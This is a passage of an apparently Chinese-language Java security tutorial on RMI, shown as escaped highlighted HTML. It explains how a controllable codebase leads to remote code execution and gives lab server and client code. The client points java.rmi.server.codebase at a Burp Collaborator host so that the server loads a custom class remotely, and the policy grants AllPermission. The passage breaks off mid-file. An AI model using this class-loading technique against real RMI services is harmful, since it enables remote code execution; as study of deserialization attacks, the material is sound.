&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">client&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">server.RMIServer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Naming&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TrainMain&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">RMIServer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">IRemoteHelloWorld&lt;/span> &lt;span style="color:#111">hello&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">RMIServer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">IRemoteHelloWorld&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://192.168.31.175:9092/Hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">ret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ret&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="codebase-to-rce">codebase to RCE&lt;/h3>
&lt;p>codebase是类似classpath的一个地址，告知JVM去哪里搜索类，常用于http, ftp这样远程的情况&lt;/p>
&lt;p>在RMI通信过程中，反序列化对象时寻找类时先在自己的classpath下寻找，如果本地找不到就回去远程加载codebase中的类，假如我们指定&lt;code>codebase=http://example.com/&lt;/code> 然后加载&lt;code>org.test.vuln&lt;/code>类，jvm就会下载&lt;code>http://example.com/org/test/vuln.class&lt;/code> 并将其作为vuln类的字节码进行加载&lt;/p>
&lt;p>所以如果codebase可控，再满足以下条件，就可以加载恶意类了：&lt;/p>
&lt;ul>
&lt;li>安装并配置了SecurityManager&lt;/li>
&lt;li>Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false&lt;/li>
&lt;/ul>
&lt;p>java.rmi.server.useCodebaseOnly是在Java 7u21、6u45的时候修改的一个默认设置，值由false改为了true；在为true的情况下JVM只信任预先配置好的codebase，不支持从RMI中获取，以下是测试代码：&lt;/p>
&lt;p>Server部分&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Icalc.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">server&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Remote&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.List&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">ICalc&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Remote&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#75af00">sum&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Calc.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">server&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.server.UnicastRemoteObject&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.List&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Calc&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">UnicastRemoteObject&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">ICalc&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Calc&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">{};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#75af00">sum&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">param&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">param&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">sum&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// CalcServer.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">server&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Naming&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.registry.LocateRegistry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CalcServer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSecurityManager&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Setup SecurityManager&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setSecurityManager&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">SecurityManager&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Calc&lt;/span> &lt;span style="color:#111">h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Calc&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">9093&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">rebind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://192.168.31.175:9093/refobj&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.security.policy&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;E:\\JavaStudy\\test01\\client.policy&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.rmi.server.hostname&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;192.168.31.175&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.rmi.server.useCodebaseOnly&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;false&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">CalcServer&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// client.policy
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">grant&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">permission&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">security&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">AllPermission&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Client部分（确保与Server的classpath不同）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// HelloClient.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">rmiT&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.Serializable&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Naming&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.ArrayList&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.List&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HelloClient&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Serializable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Payload&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">ArrayList&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">&amp;gt;{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ICalc&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ICalc&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://192.168.31.175:9093/refobj&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">li&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Payload&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">li&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">3&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">li&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">4&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sum&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">li&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.rmi.server.useCodebaseOnly&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;false&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.security.policy&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;E:\\JavaStudy\\test01\\client.policy&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.rmi.server.codebase&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://nxo90f9obuj1boi0bzbdanmca3gt4i.burpcollaborator.net/&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSecurityManager&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Setup SecurityManager&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setSecurityManager&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">SecurityManager&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HelloClient&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Icalc.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">rmiT&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Remote&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
